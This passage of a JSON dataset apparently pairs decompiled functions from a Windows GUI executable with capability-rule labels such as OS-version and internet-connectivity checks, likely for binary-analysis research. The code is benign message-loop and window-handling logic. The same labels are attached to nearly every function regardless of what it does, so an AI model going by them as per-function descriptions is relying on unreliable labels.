            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __fastcall fcn.004461cc(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    bool bVar2;\n    \n    bVar2 = false;\n    if (*(in_EAX + 0xb8) != 0) {\n        iVar1 = sub.user32.dll_IsWindowUnicode(*param_2);\n        if (iVar1 == 0) {\n            iVar1 = sub.user32.dll_IsDialogMessageA(*(in_EAX + 0xb8), param_2);\n            bVar2 = iVar1 != 0;\n        }\n        else {\n            iVar1 = sub.user32.dll_IsDialogMessageW(*(in_EAX + 0xb8), param_2);\n            bVar2 = iVar1 != 0;\n        }\n    }\n    return bVar2;\n}\n",
        "token_count": 184
    },
    "00446214": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __fastcall fcn.00446214(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    bool bVar2;\n    \n    bVar2 = false;\n    iVar1 = *(in_EAX + 0x44);\n    if ((((iVar1 != 0) && (*(iVar1 + 0x277) == '\\x02')) && (*(*0x497c20 + 0x6c) != 0)) &&\n       (*(*(*0x497c20 + 0x6c) + 0x277) == '\\x01')) {\n        iVar1 = sub.user32.dll_TranslateMDISysAccel(*(iVar1 + 0x29c), param_2);\n        bVar2 = iVar1 != 0;\n    }\n    return bVar2;\n}\n",
        "token_count": 185
    },
    "0044638c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0044638c(void)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    \n    if (*(in_EAX + 0x152) != 0) {\n        (**(in_EAX + 0x150))();\n    }\n    if (*(in_EAX + 0x44) != 0) {\n        uVar3 = fcn.00458568();\n        iVar4 = sub.user32.dll_IsWindowEnabled(uVar3);\n        if ((iVar4 != 0) && (cVar1 = fcn.0040484c(),  cVar1 != '\\0')) {\n            uVar2 = 1;\n            goto code_r0x004463e9;\n        }\n    }\n    uVar2 = 0;\ncode_r0x004463e9:\n    return CONCAT14(uVar2, uVar2);\n}\n",
        "token_count": 211
    },
    "00446494": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00446494(uint param_1, int32_t *param_2)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint uVar4;\n    char cStackY68;\n    int32_t *in_stack_ffffffc0;\n    \n    uVar4 = 0;\n    iVar3 = sub.user32.dll_PeekMessageA(param_2, 0, 0, 0, 0, param_1);\n    if (iVar3 == 0) goto code_r0x0044659e;\n    if (*param_2 == 0) {\ncode_r0x004464c5:\n        bVar1 = false;\n    }\n    else {\n        iVar3 = sub.user32.dll_IsWindowUnicode();\n        if (iVar3 == 0) goto code_r0x004464c5;\n        bVar1 = true;\n    }\n    in_stack_ffffffc0 = param_2;\n    if (bVar1) {\n        iVar3 = sub.user32.dll_PeekMessageW(param_2, 0, 0, 0, 1);\n    }\n    else {\n        iVar3 = sub.user32.dll_PeekMessageA(param_2, 0, 0, 0, 1);\n    }\n    if (iVar3 != 0) {\n        uVar4 = 1;\n        if (param_2[1] == 0x12) {\n            *(in_EAX + 0xa4) = 1;\n        }\n        else {\n            in_stack_ffffffc0 = in_stack_ffffffc0 & 0xffff00ff;\n            if (*(in_EAX + 0x102) != 0) {\n                (**(in_EAX + 0x100))();\n            }\n            cVar2 = fcn.00447d40();\n            if (cVar2 == '\\0') {\n                cVar2 = fcn.00446358();\n                if ((cVar2 == '\\0') && (in_stack_ffffffc0 >> 8 == '\\0')) {\n                    cVar2 = fcn.00446214();\n                    if (cVar2 == '\\0') {\n                        cVar2 = fcn.00446264();\n                        if (cVar2 == '\\0') {\n                            cVar2 = fcn.004461cc();\n                            if (cVar2 == '\\0') {\n                                sub.user32.dll_TranslateMessage();\n                                cStackY68 = param_2;\n                                if (cStackY68 == '\\0') {\n                                    sub.user32.dll_DispatchMessageA();\n                                    in_stack_ffffffc0 = param_2;\n                                }\n                                else {\n                                    sub.user32.dll_DispatchMessageW();\n                                    in_stack_ffffffc0 = param_2;\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\ncode_r0x0044659e:\n    return CONCAT44(in_stack_ffffffc0, uVar4);\n}\n",
        "token_count": 653
    },
    "004465cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004465cc(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    \n    if (*(in_EAX + 0xac) == '\\0') {\n        if (*(in_EAX + 0x30) != 0) {\n            sub.user32.dll_SendMessageA(*(in_EAX + 0x30), 0xb020, 0, &arg_8h);\n        }\n    }\n    else {\n        fcn.00419868();\n        puVar1 = fcn.00402f00();\n        *puVar1 = arg_8h;\n        puVar1[1] = arg_ch;\n        fcn.00419730();\n    }\n    return;\n}\n",
        "token_count": 166
    },
    "00446628": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00446628(int32_t lParam, int32_t arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if (*(in_EAX + 0xac) == '\\0') {\n        if (*(in_EAX + 0x30) != 0) {\n            sub.user32.dll_SendMessageA(*(in_EAX + 0x30), 0xb020, 1, &lParam);\n        }\n    }\n    else {\n        iVar2 = *(*(in_EAX + 0xb0) + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.00419888();\n                if ((*piVar1 == lParam) && (arg_ch == piVar1[1])) {\n                    fcn.00402f1c();\n                    fcn.0041977c();\n                    return;\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 236
    },
    "00446714": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00446714(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar2 = sub.user32.dll_GetCapture();\n    if (iVar2 != 0) {\n        uVar3 = sub.user32.dll_GetCapture(0x1f, 0, 0);\n        sub.user32.dll_SendMessageA(uVar3);\n    }\n    fcn.00402f84();\n    cVar1 = fcn.004466b8();\n    if (cVar1 == '\\0') {\n        uVar3 = fcn.00402fa4();\n        fcn.00402f84(uVar3);\n        fcn.0040da24();\n    }\n    else {\n        fcn.00402f84();\n        cVar1 = fcn.004466b8();\n        if (cVar1 == '\\0') {\n            if (*(in_EAX + 0xea) == 0) {\n                fcn.00402f84();\n                fcn.00446920();\n                return;\n            }\n            fcn.00402f84();\n            (**(in_EAX + 0xe8))();\n        }\n    }\n    return;\n}\n",
        "token_count": 270
    },
    "004467a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004467a4(uint32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack132;\n    int32_t iStack128;\n    uint *puStack124;\n    uint uStack120;\n    uint uStack116;\n    int32_t iStack112;\n    int32_t iStack108;\n    int32_t lpRect;\n    uint *var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t hWnd;\n    uint var_ch;\n    uint lpCaption;\n    int32_t var_4h;\n    \n    iStack108 = 0x4467c0;\n    var_4h = in_EAX;\n    iStack112 = fcn.00447b54();\n    iVar2 = iStack112;\n    if (iStack112 == 0) {\n        iVar2 = *(var_4h + 0x30);\n    }\n    iStack108 = 2;\n    uStack116 = 0x4467e3;\n    hWnd = iStack112;\n    var_18h = (***0x4924d8)();\n    uStack116 = 2;\n    uStack120 = *(var_4h + 0x30);\n    puStack124 = 0x4467f8;\n    var_1ch = (***0x4924d8)();\n    if (var_18h != var_1ch) {\n        var_48h = 0x28;\n        puStack124 = &fcn.004467a4::var_48h;\n        iStack128 = var_18h;\n        iStack132 = 0x44681b;\n        (***0x492400)();\n        var_54h = &fcn.004467a4::lpRect;\n        lpRect = *(var_4h + 0x30);\n        sub.user32.dll_GetWindowRect();\n        iStack108 = var_38h - var_40h >> 1;\n        if (iStack108 < 0) {\n            iStack108 = iStack108 + ((var_38h - var_40h & 1U) != 0);\n        }\n        iStack108 = iStack108 + var_40h;\n        iStack112 = var_3ch - var_44h >> 1;\n        if (iStack112 < 0) {\n            iStack112 = iStack112 + ((var_3ch - var_44h & 1U) != 0);\n        }\n        iStack112 = iStack112 + var_44h;\n        uStack116 = 0;\n        uStack120 = *(var_4h + 0x30);\n        puStack124 = 0x446863;\n        sub.user32.dll_SetWindowPos();\n    }\n    puStack124 = 0x44686b;\n    var_14h = fcn.0043b890();\n    puStack124 = 0x446873;\n    var_20h = fcn.0043b6ec();\n    puStack124 = 0x44687e;\n    cVar1 = fcn.004456c0();\n    if (cVar1 != '\\0') {\n        arg_8h = arg_8h | 0x100000;\n    }\n    iStack128 = 0x44690c;\n    iStack132 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff7c;\n    puStack124 = &stack0xfffffffc;\n    var_ch = sub.user32.dll_MessageBoxA_1();\n    *in_FS_OFFSET = iVar2;\n    if (var_18h != var_1ch) {\n        iVar2 = var_4ch - var_54h >> 1;\n        if (iVar2 < 0) {\n            iVar2 = iVar2 + ((var_4ch - var_54h & 1U) != 0);\n        }\n        iVar3 = var_50h - lpRect >> 1;\n        if (iVar3 < 0) {\n            iVar3 = iVar3 + ((var_50h - lpRect & 1U) != 0);\n        }\n        sub.user32.dll_SetWindowPos(*(var_4h + 0x30), 0, iVar3 + lpRect, iVar2 + var_54h, 0, 0, 0x1d, 0x446913, arg_8h);\n    }\n    fcn.0043b954();\n    sub.user32.dll_SetActiveWindow(hWnd);\n    fcn.0043b6f4();\n    return;\n}\n",
        "token_count": 1106
    },
    "00446920": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00446959)\n// WARNING: Removing unreachable block (ram,0x00446980)\n\nvoid fcn.00446920(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint uStack288;\n    uint uStack284;\n    uchar *puStack280;\n    uint var_108h;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack280 = &stack0xfffffffc;\n    uStack284 = 0x4469db;\n    uStack288 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffee0;\n    fcn.004055c8();\n    arg_8h = 0x10;\n    fcn.0044614c();\n    uVar1 = fcn.004059dc();\n    fcn.004059dc(uVar1);\n    fcn.004467a4(arg_8h);\n    *in_FS_OFFSET = arg_8h;\n    uStack284 = 0x4469e2;\n    uStack288 = 0x4469d2;\n    fcn.00405530();\n    uStack288 = 0x4469da;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 282
    },
    "004469f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004469f8(char param_1, uint32_t param_2)\n\n{\n    char cVar1;\n    int16_t iVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    uint *arg_8h;\n    char cStack28;\n    uint uStack24;\n    \n    iVar4 = 0;\n    uStack24 = CONCAT31(uStack24._1_3_, 1);\n    arg_8h = &uStack24;\n    uVar3 = fcn.00446b20(arg_8h);\n    cStack28 = param_1;\n    if (uVar3 == '\\0') {\n        iVar4 = *(*0x497c20 + 0x68);\n        if ((iVar4 != 0) && ((*(iVar4 + 0x1c) & 0x10) != 0)) {\n            cStack28 = '\\0';\n        }\n        if ((((iVar4 != 0) && (iVar2 = fcn.00458784(),  iVar2 == -1)) && (*(iVar4 + 0x57) == '\\0')) &&\n           (*(iVar4 + 0x268) == 0)) {\n            cStack28 = '\\0';\n        }\n    }\n    if (cStack28 != '\\0') {\n        if (((iVar4 != 0) && (cVar1 = fcn.00458874(),  cVar1 != '\\0')) && (*(iVar4 + 0x284) != 0)) {\n            uStack24 = fcn.00458568();\n            cVar1 = fcn.004471bc();\n            if (cVar1 == '\\0') {\n                return uVar3;\n            }\n            uVar3 = (**(**(in_EAX + 0x4c) + 0x20))(arg_8h, param_2);\n            return uVar3;\n        }\n        if (*(in_EAX + 0x50) == 0) {\n            if (*(in_EAX + 0xac) == '\\0') {\n                sub.user32.dll_PostMessageA(*(in_EAX + 0x30), 0xb01f, param_2 & 0xffff, arg_8h);\n            }\n        }\n        else {\n            uStack24 = *(in_EAX + 0x30);\n            if (*(in_EAX + 0x44) != 0) {\n                uStack24 = fcn.00458568();\n            }\n            cVar1 = fcn.004471bc();\n            if (cVar1 != '\\0') {\n                uVar3 = (**(**(in_EAX + 0x4c) + 0x20))(arg_8h, param_2);\n            }\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 612
    },
    "00446b20": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00446b20(uchar *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_ch;\n    uint var_6h;\n    \n    uVar2 = 0;\n    *arg_8h = 1;\n    iVar3 = 0;\n    if (*(*0x497c20 + 100) != 0) {\n        iVar3 = fcn.0043bd00();\n        if ((iVar3 != 0) && (*(iVar3 + 0x2f2) != 0)) {\n            uVar2 = (**(iVar3 + 0x2f0))(arg_8h);\n        }\n    }\n    if (uVar2 == '\\0') {\n        iVar1 = *(*0x497c20 + 0x68);\n        if ((((iVar1 != 0) && (iVar3 != iVar1)) && (iVar1 != 0)) && (*(iVar1 + 0x2f2) != 0)) {\n            uVar2 = (**(iVar1 + 0x2f0))(arg_8h);\n        }\n        if ((uVar2 == '\\0') && (*(in_EAX + 0x11a) != 0)) {\n            uVar2 = (**(in_EAX + 0x118))(arg_8h);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 320
    },
    "00446bec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00446bec(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack28 = &fcn.00446bec::var_1h + 1;\n    uStack32 = 0x446c6a;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    arg_8h = &fcn.00446bec::var_1h;\n    fcn.004059dc();\n    fcn.00446b20(arg_8h);\n    if ((var_1h != '\\0') && (cVar1 = fcn.004471bc(),  cVar1 != '\\0')) {\n        fcn.00447b18();\n        (**(**(in_EAX + 0x4c) + 0xc))();\n    }\n    *in_FS_OFFSET = arg_8h;\n    uStack32 = 0x446c71;\n    iStack36 = 0x446c69;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 309
    },
    "00446c7c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00446c7c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack28 = &fcn.00446c7c::var_1h + 1;\n    uStack32 = 0x446cf3;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    arg_8h = &fcn.00446c7c::var_1h;\n    fcn.00446b20(arg_8h);\n    if ((var_1h != '\\0') && (cVar1 = fcn.004471bc(),  cVar1 != '\\0')) {\n        fcn.00447b18();\n        (**(**(in_EAX + 0x4c) + 0x10))();\n    }\n    *in_FS_OFFSET = arg_8h;\n    uStack32 = 0x446cfa;\n    iStack36 = 0x446cf2;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 307
    },
    "00446de4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00446de4(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    if (*0x497c1c != 0) {\n        uStack24 = 0x446e29;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack28;\n        uVar1 = 0;\n        sub.user32.dll_KillTimer(0, *0x497c48);\n        *0x497c48 = 0;\n        fcn.00446d5c();\n        *in_FS_OFFSET = uVar1;\n    }\n    return;\n}\n",
        "token_count": 166
    },
    "00446e4c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00446e4c(void)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x446f99;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x446e76;\n    fcn.00446dc0();\n    if ((*(in_EAX + 0x88) != '\\0') && (*(in_EAX + 0x48) == 0)) {\n        puStack48 = 0x446e95;\n        fcn.00447414();\n    }\n    puStack48 = 0x446e9f;\n    fcn.00444940();\n    puStack48 = 0x446eaa;\n    fcn.0044d518();\n    puStack48 = 0x446eb7;\n    fcn.00447044();\n    bVar1 = true;\n    uStack52 = 0x446f40;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    if (*(in_EAX + 0x12a) != 0) {\n        puStack48 = &stack0xfffffffc;\n        (**(in_EAX + 0x128))();\n    }\n    if (*(in_EAX + 0xc0) < 1) {\n        fcn.00446d5c();\n    }\n    else if ((*0x497c48 == 0) &&\n            (*0x497c48 = sub.user32.dll_SetTimer(0, 0, *(in_EAX + 0xc0), fcn.00446de4),  *0x497c48 == 0)) {\n        fcn.00446d5c();\n    }\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x446f5a;\n    iVar3 = sub.kernel32.dll_GetCurrentThreadId_1();\n    if (iVar3 == **0x4927d8) {\n        puStack48 = 0x446f6b;\n        cVar2 = fcn.0041f734();\n        if (cVar2 != '\\0') {\n            bVar1 = false;\n        }\n    }\n    if (bVar1) {\n        puStack48 = 0x446f7e;\n        sub.user32.dll_WaitMessage();\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x446fa0;\n    uStack40 = 0x446f98;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 669
    },
    "00447044": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00447044(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar in_ZF;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x447058;\n    fcn.00405974();\n    if (!in_ZF) {\n        puStack20 = 0x447064;\n        fcn.00405584();\n        if (*(in_EAX + 0x122) == 0) {\n            puStack20 = 0x44708c;\n            fcn.00431bcc();\n            puStack20 = 0x447099;\n            fcn.0044a960();\n            uStack24 = 0x4470c9;\n            uStack28 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe4;\n            puStack20 = &stack0xfffffffc;\n            fcn.0040484c();\n            *in_FS_OFFSET = uStack28;\n            puStack20 = 0x4470d0;\n            uStack24 = 0x4470c8;\n            fcn.00404650();\n            return;\n        }\n        puStack20 = 0x44707c;\n        (**(in_EAX + 0x120))();\n    }\n    return;\n}\n",
        "token_count": 298
    },
    "00447134": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00447134(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x30) != 0) {\n        iVar2 = fcn.00443d74();\n        if (-1 < iVar2 + -1) {\n            do {\n                iVar3 = fcn.00443d60();\n                if (*(iVar3 + 0x57) != '\\0') {\n                    if ((*(iVar3 + 0x1c4) == 0) || (cVar1 = fcn.00458874(),  cVar1 == '\\0')) {\ncode_r0x0044719b:\n                        fcn.004470d8(&stack0xfffffffc);\n                        return;\n                    }\n                    fcn.00458568(*(iVar3 + 0x1c4));\n                    iVar3 = sub.user32.dll_IsChild();\n                    if (iVar3 == 0) goto code_r0x0044719b;\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        fcn.004470d8(&stack0xfffffffc);\n    }\n    return;\n}\n",
        "token_count": 279
    },
    "004471bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.004471bc(void)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = in_EAX;\n    if (*(in_EAX + 0x4c) == 0) {\n        fcn.0040700c();\n        uVar1 = fcn.0042d290();\n    }\n    return uVar1 & 0xffffff00 | *(in_EAX + 0x4c) != 0;\n}\n",
        "token_count": 108
    },
    "004471dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004471dc(uchar param_1, uint param_2)\n\n{\n    ushort uVar1;\n    int32_t in_EAX;\n    \n    fcn.00447220();\n    uVar1 = sub.user32.dll_SetTimer(0, 0, param_2, fcn.00444998);\n    *(in_EAX + 0x8a) = uVar1;\n    *(in_EAX + 0x89) = param_1;\n    if (*(in_EAX + 0x8a) == 0) {\n        fcn.00447414();\n    }\n    return;\n}\n",
        "token_count": 138
    },
    "00447414": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00447414(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x60) != 0) {\n        fcn.004473a0();\n        *(in_EAX + 0x60) = 0;\n        *(in_EAX + 0x58) = 0;\n        fcn.00444b00();\n        fcn.00447220();\n    }\n    return;\n}\n",
        "token_count": 99
    },
    "0044744c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0044744c(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack92;\n    uint uStack88;\n    uchar *puStack84;\n    int32_t iStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint *puStack64;\n    uint uStack60;\n    uint var_28h;\n    int32_t var_20h;\n    uint var_1ch;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uStack60 = 0xe;\n    puStack64 = 0x447460;\n    var_4h = (***0x492428)();\n    puStack64 = &fcn.0044744c::var_28h;\n    uStack68 = 0x44746c;\n    uStack68 = sub.user32.dll_GetCursor();\n    puStack72 = 0x447472;\n    iVar2 = sub.user32.dll_GetIconInfo();\n    if (iVar2 != 0) {\n        uStack76 = 0x447590;\n        iStack80 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffb0;\n        puStack84 = 0x447496;\n        puStack72 = &stack0xfffffffc;\n        fcn.00426954();\n        puStack84 = 0x4474a1;\n        iVar2 = fcn.00402ee8();\n        uStack88 = 0x447561;\n        iStack92 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffa4;\n        var_8h = iVar2 + var_8h;\n        puStack84 = &stack0xfffffffc;\n        var_10h = iVar2;\n        cVar1 = fcn.00426a10(var_8h);\n        if ((cVar1 != '\\0') && (*(var_10h + 0xe) == 1)) {\n            uVar3 = *(iVar2 + 4) * *(iVar2 + 0xe) + 0x1f & 0xffffffe0;\n            if (uVar3 < 0) {\n                uVar3 = uVar3 + 7;\n            }\n            var_14h = uVar3 >> 3;\n            var_4h = fcn.0044743c();\n            if ((var_4h == 0) && (SBORROW4(*(iVar2 + 8), *(iVar2 + 4) * 2) == *(iVar2 + 8) + *(iVar2 + 4) * -2 < 0)) {\n                var_4h = fcn.0044743c();\n            }\n            var_4h = var_4h / var_14h - var_20h;\n        }\n        *in_FS_OFFSET = var_8h;\n        uStack88 = 0x447568;\n        iStack92 = 0x447560;\n        iVar2 = fcn.00402f1c();\n        return iVar2;\n    }\n    return var_4h;\n}\n",
        "token_count": 723
    },
    "00447604": {
